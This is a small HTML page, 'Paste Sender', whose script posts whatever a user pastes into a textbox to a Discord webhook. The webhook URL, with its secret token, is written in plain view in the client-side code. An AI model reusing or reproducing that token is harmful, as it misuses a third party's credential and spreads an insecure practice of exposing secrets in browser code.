<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Paste Sender</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <style>
    /* Animated gradient background */
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(-45deg, #1e3c72, #2a5298, #6a11cb, #2575fc);
      background-size: 400% 400%;
      animation: gradient 12s ease infinite;
      font-family: Arial, sans-serif;
    }

    @keyframes gradient {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .box {
      background: rgba(0, 0, 0, 0.6);
      padding: 20px;
      border-radius: 10px;
      width: 320px;
      text-align: center;
    }

    textarea {
      width: 100%;
      height: 120px;
      border-radius: 6px;
      border: none;
      padding: 10px;
      resize: none;
      font-size: 14px;
    }

    button {
      margin-top: 12px;
      width: 100%;
      padding: 10px;
      font-size: 15px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      background-color: #4caf50;
      color: white;
    }

    button:hover {
      background-color: #43a047;
    }
  </style>
</head>
<body>

  <div class="box">
    <textarea id="pasteBox" placeholder="Paste Here"></textarea>
    <button onclick="sendToWebhook()">Send</button>
  </div>

  <script>
    async function sendToWebhook() {
      const content = document.getElementById("pasteBox").value;

      if (!content.trim()) {
        alert("Textbox is empty.");
        return;
      }

      await fetch("https://discord.com/api/webhooks/1462587403184242788/dcNUoUwE7nD5ZXLXHEilbjh5pRdH-YjZriXI4rza-RX8aAu3nk4nRQwZxe_vbaEabFyX", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: content
        })
      });

      document.getElementById("pasteBox").value = "";
      alert("Sent!");
    }
  </script>

</body>
</html>
